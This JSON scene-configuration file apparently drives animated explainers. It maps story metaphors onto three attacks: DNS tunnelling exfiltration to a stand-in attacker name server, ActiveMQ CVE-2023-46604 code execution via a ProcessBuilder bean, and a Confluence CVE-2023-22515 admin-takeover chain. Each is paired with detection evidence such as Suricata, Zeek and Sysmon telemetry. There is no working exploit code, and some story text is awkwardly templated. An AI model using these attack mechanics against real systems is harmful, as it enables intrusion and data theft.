          "id": "net-dnstunnel-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Company mailroom",
          "subtitle": "Internal recursive DNS resolver (10.50.1.53)",
          "tone": "amber"
        },
        {
          "id": "net-dnstunnel-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Front gate guard",
          "subtitle": "Corporate egress perimeter firewall",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card Than",
          "stageTag": "STEP 02 · SETUP",
          "title": "Company mailroom",
          "storyExcerpt": "The clerk drops the lookup card into the company mailroom rather than walking to the front gate.",
          "technicalParallel": "While the Egress Firewall blocks direct outbound connections from DB-BACKUP-02 (10.50.1.12), it permits outbound UDP/53 recursive queries originating from the corporate DNS server (10.50.1.53, which…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Gate",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Front gate guard",
          "storyExcerpt": "Because the gate guard trusts every bag stamped by the company mailroom, the coded inquiry sails straight outside to the remote district office.",
          "technicalParallel": "Because every single query from DB-BACKUP-02 contains a unique hex-encoded chunk of stolen data in the subdomain label (guaranteeing a 100% DNS cache miss rate so the resolver can never answer from local…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Remote district office",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across remote district office while locking down mailroom stamped bag.",
          "technicalParallel": "Documented in Zeek dns.log & Suricata SID 9004120: 10.50.1.53 -> 45.133.1.99:53 recursive TXT query (qtype = 16, 164 B) with 100% unique subdomains (>52 chars) and answers=\"ACK:001:NEXT\" with TTL =…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Chute",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gate Guard",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Postcard Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1071.004"
    },
    "step-3": {
      "scenarioId": "dns-tunneling-exfil",
      "sectionKey": "step-3",
      "sceneKind": "net-dnstunnel-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Reassembling Exfiltrated CSV Chunks & Returning C2 Commands in DNS TXT Answers (TTL=0)",
      "storyCue": "The remote district office copies the digit strip off each incoming card to rebuild the stolen customer ledger in order. It then writes a short receipt and next-task note on a return slip marked to expire immediately so the company mailroom never keeps a cached copy.",
      "technicalCue": "T1071.004 · EXFIL & IMPACT — When the recursive query arrives at the attacker’s authoritative Name Server (ns1.badactor-dns.net, 45.133.1.99:53), the dnscat2/exfil daemon strips the .c2.badactor-dns.net suffix, hex-decodes…",
      "storyMappings": [
        {
          "storyTerm": "Rebuilt customer ledger",
          "technicalTerm": "Reassembled exfiltrated CSV records",
          "tone": "amber"
        },
        {
          "storyTerm": "Return slip note",
          "technicalTerm": "DNS TXT response carrying ACK and sleep directives",
          "tone": "sky"
        },
        {
          "storyTerm": "Immediate expiry stamp",
          "technicalTerm": "Zero-second TTL value preventing resolver caching",
          "tone": "rose"
        },
        {
          "storyTerm": "Archive room workstation",
          "technicalTerm": "Source database backup host (10.50.1.12)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-dnstunnel-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Rebuilt customer ledger",
          "subtitle": "Reassembled exfiltrated CSV records",
          "tone": "amber"
        },
        {
          "id": "net-dnstunnel-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Return slip note",
          "subtitle": "DNS TXT response carrying ACK and sleep directives",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Off Each",
          "stageTag": "STEP 03 · SETUP",
          "title": "Rebuilt customer ledger",
          "storyExcerpt": "The remote district office copies the digit strip off each incoming card to rebuild the stolen customer ledger in order.",
          "technicalParallel": "This completes a bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS query subdomain labels (QNAME), while inbound acknowledgments and C2 tasking (the 188-byte TXT…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Slip Note",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Return slip note",
          "storyExcerpt": "It then writes a short receipt and next-task note on a return slip marked to expire immediately so the company mailroom never keeps a cached copy.",
          "technicalParallel": "When the recursive query arrives at the attacker’s authoritative Name Server (ns1.badactor-dns.net, 45.133.1.99:53), the dnscat2/exfil daemon strips the .c2.badactor-dns.net suffix, hex-decodes chunk…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Room",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Archive room workstation",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across archive room workstation while locking down immediate expiry stamp.",
          "technicalParallel": "Documented in Sigma and Suricata DNS rules (network and host detection signatures that flag covert command-and-control over domain lookups): 188-byte DNS TXT response with TTL = 0.000000 carrying \"TXT…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mail Chute",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Gate Guard",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Postcard Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1071.004"
    }
  },
  "apache-activemq-cve-2023-46604-openwire": {
    "briefing": {
      "scenarioId": "apache-activemq-cve-2023-46604-openwire",
      "sectionKey": "briefing",
      "sceneKind": "net-activemq-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Apache ActiveMQ OpenWire ExceptionResponse Deserialization RCE — Story-to-Technical Overview",
      "storyCue": "A railway dispatch broker lets incoming error notices name which official handbook to open when logging a fault. An outsider sends a forged fault notice naming an automated blueprint loader instead of a standard error card, causing the broker to fetch an outside instruction sheet and launch system commands directly.",
      "technicalCue": "INITIAL ACCESS: OpenWire ExceptionResponse (0x1F) Arbitrary Class Instantiation -> EXECUTION: createThrowable() Reflection & Remote Spring XML Fetch -> EXECUTION: Spring ProcessBuilder init-method=\"start\" RCE",
      "storyMappings": [
        {
          "storyTerm": "Railway dispatch broker",
          "technicalTerm": "Apache ActiveMQ OpenWire messaging server",
          "tone": "amber"
        },
        {
          "storyTerm": "Forged fault notice",
          "technicalTerm": "Crafted OpenWire ExceptionResponse (0x1F) frame (CVE-2023-46604)",
          "tone": "sky"
        },
        {
          "storyTerm": "Automated blueprint loader",
          "technicalTerm": "Spring ClassPathXmlApplicationContext constructor",
          "tone": "rose"
        },
        {
          "storyTerm": "Outside instruction sheet",
          "technicalTerm": "Remote XML bean definition spawning OS commands",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-activemq-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Railway dispatch broker",
          "subtitle": "Apache ActiveMQ OpenWire messaging server",
          "tone": "amber"
        },
        {
          "id": "net-activemq-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Forged fault notice",
          "subtitle": "Crafted OpenWire ExceptionResponse (0x1F) frame (CVE-2023-46604)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "OpenWire ExceptionResponse (0x1F) Arbitrary Class Instantiation",
          "storyExcerpt": "An outsider sends a specially tagged error frame straight to the broker dispatch track. Instead of naming a routine alarm card, the frame names a powerful configuration loader paired with an external…",
          "technicalParallel": "In the OpenWire binary protocol, byte offset 4 specifies the command data structure type: 0x1F (31) routes the packet directly to ExceptionResponseMarshaller.tightUnmarshal(), which calls…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Card Out",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "createThrowable() Reflection & Remote Spring XML Fetch",
          "storyExcerpt": "Without checking whether the named handbook is actually an error card, the broker reflexively constructs the blueprint loader and walks out to fetch the remote instruction sheet from the outsider address.",
          "technicalParallel": "Because Apache ActiveMQ bundles spring-context in its default lib/ directory, org.springframework.context.support.ClassPathXmlApplicationContext is always present on the broker’s classpath and accepts an…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Pre-wired",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "Spring ProcessBuilder init-method=\"start\" RCE",
          "storyExcerpt": "As soon as the broker reads the fetched instruction sheet, a pre-wired assembly entry launches the station command console directly under the broker service badge. Continuing the same characters and room…",
          "technicalParallel": "Apache patched CVE-2023-46604 in ActiveMQ 5.18.3 by adding a strict type check inside BaseDataStreamMarshaller.createThrowable(): if (!Throwable.class.isAssignableFrom(clazz)) throw new IOException(...).",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Track",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Blueprint Hub",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Fault Frame",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "apache-activemq-cve-2023-46604-openwire",
      "sectionKey": "step-1",
      "sceneKind": "net-activemq-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Sending a Crafted OpenWire ExceptionResponse (0x1F) Frame to TCP Port 61616",
      "storyCue": "An outsider sends a specially tagged error frame straight to the broker dispatch track. Instead of naming a routine alarm card, the frame names a powerful configuration loader paired with an external street address.",
      "technicalCue": "T1190 · INITIAL ACCESS — The attacker connects to the Apache ActiveMQ broker on TCP port 61616 (the binary OpenWire messaging port exposed by default) and sends a crafted Command Type 31 (0x1F ExceptionResponse) frame.",
      "storyMappings": [
        {
          "storyTerm": "Broker dispatch track",
          "technicalTerm": "Exposed OpenWire TCP port 61616 listener",
          "tone": "amber"
        },
        {
          "storyTerm": "Tagged error frame",
          "technicalTerm": "OpenWire ExceptionResponse command byte 0x1F",
          "tone": "sky"
        },
        {
          "storyTerm": "Named configuration loader",
          "technicalTerm": "ClassPathXmlApplicationContext class string",
          "tone": "rose"
        },
        {
          "storyTerm": "External street address",
          "technicalTerm": "Attacker-hosted HTTP URL pointing to remote XML",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-activemq-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Broker dispatch track",
          "subtitle": "Exposed OpenWire TCP port 61616 listener",
          "tone": "amber"
        },
        {
          "id": "net-activemq-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Tagged error frame",
          "subtitle": "OpenWire ExceptionResponse command byte 0x1F",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card",
          "stageTag": "STEP 01 · SETUP",
          "title": "Broker dispatch track",
          "storyExcerpt": "An outsider sends a specially tagged error frame straight to the broker dispatch track.",
          "technicalParallel": "In the OpenWire binary protocol, byte offset 4 specifies the command data structure type: 0x1F (31) routes the packet directly to ExceptionResponseMarshaller.tightUnmarshal(), which calls…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Card",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Tagged error frame",
          "storyExcerpt": "Instead of naming a routine alarm card, the frame names a powerful configuration loader paired with an external street address.",
          "technicalParallel": "The attacker connects to the Apache ActiveMQ broker on TCP port 61616 (the binary OpenWire messaging port exposed by default) and sends a crafted Command Type 31 (0x1F ExceptionResponse) frame.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "External street address",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across external street address while locking down named configuration loader.",
          "technicalParallel": "Documented by Rapid7 and Suricata network rules (wire-level detection for CVE-2023-46604): TCP port 61616 packets carrying OpenWire command byte 0x1F alongside the ASCII string…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Track",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Blueprint Hub",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Fault Frame",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "apache-activemq-cve-2023-46604-openwire",
      "sectionKey": "step-2",
      "sceneKind": "net-activemq-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Reflective Instantiation in BaseDataStreamMarshaller.createThrowable() & Fetching poc.xml",
      "storyCue": "Without checking whether the named handbook is actually an error card, the broker reflexively constructs the blueprint loader and walks out to fetch the remote instruction sheet from the outsider address.",
      "technicalCue": "T1203 · EXECUTION — Inside the ActiveMQ broker, BaseDataStreamMarshaller.createThrowable() looks up the attacker-supplied class name and invokes its single-String constructor via Java reflection (because prior to…",
      "storyMappings": [
        {
          "storyTerm": "Unchecked handbook builder",
          "technicalTerm": "BaseDataStreamMarshaller.createThrowable() reflection call",
          "tone": "amber"
        },
        {
          "storyTerm": "Fetching the instruction sheet",
          "technicalTerm": "Loading remote Spring XML bean definitions over HTTP",
          "tone": "sky"
        },
        {
          "storyTerm": "Broker operations log",
          "technicalTerm": "data/activemq.log application runtime journal",
          "tone": "rose"
        },
        {
          "storyTerm": "Missing safety check",
          "technicalTerm": "Unrestricted arbitrary class instantiation vulnerability",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-activemq-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Unchecked handbook builder",
          "subtitle": "BaseDataStreamMarshaller.createThrowable() reflection call",
          "tone": "amber"
        },
        {
          "id": "net-activemq-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Fetching the instruction sheet",
          "subtitle": "Loading remote Spring XML bean definitions over HTTP",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card Out",
          "stageTag": "STEP 02 · SETUP",
          "title": "Unchecked handbook builder",
          "storyExcerpt": "Without checking whether the named handbook is actually an error card, the broker reflexively constructs the blueprint loader and walks out to fetch the remote instruction sheet from the…",
          "technicalParallel": "Because Apache ActiveMQ bundles spring-context in its default lib/ directory, org.springframework.context.support.ClassPathXmlApplicationContext is always present on the broker’s classpath and accepts an…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Log",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Fetching the instruction sheet",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses fetching the instruction sheet to advance toward broker operations log.",
          "technicalParallel": "Inside the ActiveMQ broker, BaseDataStreamMarshaller.createThrowable() looks up the attacker-supplied class name and invokes its single-String constructor via Java reflection (because prior to 5.18.3…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Card Out",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Missing safety check",
          "storyExcerpt": "Behind the scenes, missing safety check captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Huntress and Rapid7 (application log evidence of ActiveMQ RCE): data/activemq.log entries recording Refreshing org.springframework.context.support.ClassPathXmlApplicationContext and Loading…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Track",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Blueprint Hub",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Fault Frame",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1203"
    },
    "step-3": {
      "scenarioId": "apache-activemq-cve-2023-46604-openwire",
      "sectionKey": "step-3",
      "sceneKind": "net-activemq-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Executing Arbitrary OS Commands via Spring <bean class=\"java.lang.ProcessBuilder\" init-method=\"start\">",
      "storyCue": "As soon as the broker reads the fetched instruction sheet, a pre-wired assembly entry launches the station command console directly under the broker service badge. Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced prop has one explicit job.",
      "technicalCue": "T1059.004 · EXECUTION — As Spring initializes the beans defined in poc.xml, it constructs a bean of class java.lang.ProcessBuilder with constructor arguments [\"/bin/sh\", \"-c\", \"...\"] and triggers init-method=\"start\"…",
      "storyMappings": [
        {
          "storyTerm": "Pre-wired assembly entry",
          "technicalTerm": "Spring bean invoking java.lang.ProcessBuilder",
          "tone": "amber"
        },
        {
          "storyTerm": "Broker service process",
          "technicalTerm": "ActiveMQ java or wrapper.exe runtime",
          "tone": "sky"
        },
        {
          "storyTerm": "Launched command console",
          "technicalTerm": "Spawned cmd.exe, powershell.exe, msiexec.exe, or /bin/sh",
          "tone": "rose"
        },
        {
          "storyTerm": "Process lineage monitor",
          "technicalTerm": "Sysmon EventID 1 and Linux Auditd EXECVE records",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-activemq-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Pre-wired assembly entry",
          "subtitle": "Spring bean invoking java.lang.ProcessBuilder",
          "tone": "amber"
        },
        {
          "id": "net-activemq-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Broker service process",
          "subtitle": "ActiveMQ java or wrapper.exe runtime",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pre-wired",
          "stageTag": "STEP 03 · SETUP",
          "title": "Pre-wired assembly entry",
          "storyExcerpt": "As soon as the broker reads the fetched instruction sheet, a pre-wired assembly entry launches the station command console directly under the broker service badge.",
          "technicalParallel": "Apache patched CVE-2023-46604 in ActiveMQ 5.18.3 by adding a strict type check inside BaseDataStreamMarshaller.createThrowable(): if (!Throwable.class.isAssignableFrom(clazz)) throw new IOException(...).",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Same Room",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Broker service process",
          "storyExcerpt": "Continuing the same characters and room from the previous beat, the operator performs two more concrete physical movements that an animator can stage without guessing, and each newly introduced…",
          "technicalParallel": "As Spring initializes the beans defined in poc.xml, it constructs a bean of class java.lang.ProcessBuilder with constructor arguments [\"/bin/sh\", \"-c\", \"...\"] and triggers init-method=\"start\" (a standard…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Process lineage monitor",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across process lineage monitor while locking down launched command console.",
          "technicalParallel": "Documented by Huntress and Trend Micro (endpoint execution telemetry for ActiveMQ compromise): Sysmon EventID 1 or Auditd EXECVE showing java or wrapper.exe (ActiveMQ) spawning cmd.exe, powershell.exe…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Dispatch Track",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Blueprint Hub",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Fault Frame",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    },
    "memory-forensics": {
      "scenarioId": "apache-activemq-cve-2023-46604-openwire",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-activemq-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Apache ActiveMQ OpenWire ExceptionResponse Deserialization RCE — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of dispatch track beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: java (ActiveMQ Broker) (OpenWire Unmarshalled ExceptionResponse Heap Object [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of java (ActiveMQ Broker)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00000006C0400000 (RW-, 32 KB) · OpenWire Unmarshalled ExceptionResponse Heap Object",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against java (ActiveMQ Broker) (PID 3190)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Reflectively instantiated ClassPathXmlApplicationContext object created by BaseDataStreamMarshaller.createThrowable().",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-activemq-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of java (ActiveMQ…",
          "tone": "sky"
        },
        {
          "id": "net-activemq-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00000006C0400000 (RW-, 32 KB) · OpenWire Unmarshalled…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline java (ActiveMQ Broker) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00000006C0400000 (RW-, 32 KB) containing OpenWire Unmarshalled ExceptionResponse Heap Object.",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 3190 confirms injected region: Reflectively instantiated ClassPathXmlApplicationContext object created by BaseDataStreamMarshaller.createThrowable().",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "atlassian-confluence-cve-2023-22515-storm0062": {
    "briefing": {
      "scenarioId": "atlassian-confluence-cve-2023-22515-storm0062",
      "sectionKey": "briefing",
      "sceneKind": "net-confluence-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Storm-0062: Atlassian Confluence XWork OGNL Setup Reset & OSGi Webshell — Story-to-Technical Overview",
      "storyCue": "A team library locks its opening-day setup desk once the building opens, controlled by a single \"setup finished\" toggle switch behind a glass pane. An outsider reaches through a chained settings dial to flip that switch back to \"unfinished\", walks up to register a brand-new head librarian account, and uploads a custom tool extension to run commands across the building.",
      "technicalCue": "INITIAL ACCESS: XWork Parameter Injection (/server-info.action setupComplete=false) -> PERSISTENCE: Rogue Admin Provisioning (/setup/setupadministrator.action) -> PERSISTENCE: Malicious OSGi Plugin Upload & JVM Shell Execution",
      "storyMappings": [
        {
          "storyTerm": "Team knowledge library",
          "technicalTerm": "Atlassian Confluence Data Center and Server",
          "tone": "amber"
        },
        {
          "storyTerm": "Flipped setup-finished switch",
          "technicalTerm": "Resetting setupComplete=false via XWork chaining (CVE-2023-22515)",
          "tone": "sky"
        },
        {
          "storyTerm": "New head librarian account",
          "technicalTerm": "Unauthorized confluence-administrators user registration",
          "tone": "rose"
        },
        {
          "storyTerm": "Custom tool extension",
          "technicalTerm": "Uploaded malicious OSGi servlet plugin",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-confluence-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Team knowledge library",
          "subtitle": "Atlassian Confluence Data Center and Server",
          "tone": "amber"
        },
        {
          "id": "net-confluence-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Flipped setup-finished switch",
          "subtitle": "Resetting setupComplete=false via XWork chaining…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "XWork Parameter Injection (/server-info.action setupComplete=false)",
          "storyExcerpt": "An outsider sends a chained property request to the public status desk. Following the chain of internal dials, the server unknowingly flips its own \"setup finished\" latch back to open.",
          "technicalParallel": "Because ServerInfoAction inherits from ConfluenceActionSupport, which exposes a public getBootstrapStatusProvider() getter returning the global BootstrapStatusProvider bean, XWork’s ParametersInterceptor…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Now It",
